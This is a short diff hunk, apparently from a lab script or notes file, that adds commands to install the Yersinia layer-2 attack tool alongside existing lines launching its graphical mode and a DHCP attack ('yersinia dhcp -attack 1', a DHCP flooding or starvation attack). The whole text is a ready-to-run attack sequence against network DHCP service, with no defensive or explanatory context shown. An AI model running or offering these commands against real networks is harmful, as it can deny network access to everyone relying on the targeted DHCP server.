@@ -1,3 +1,6 @@
+sudo apt update
+sudo apt install yersinia -y
+
 sudo yersinia -G
 
 sudo yersinia dhcp -attack 1
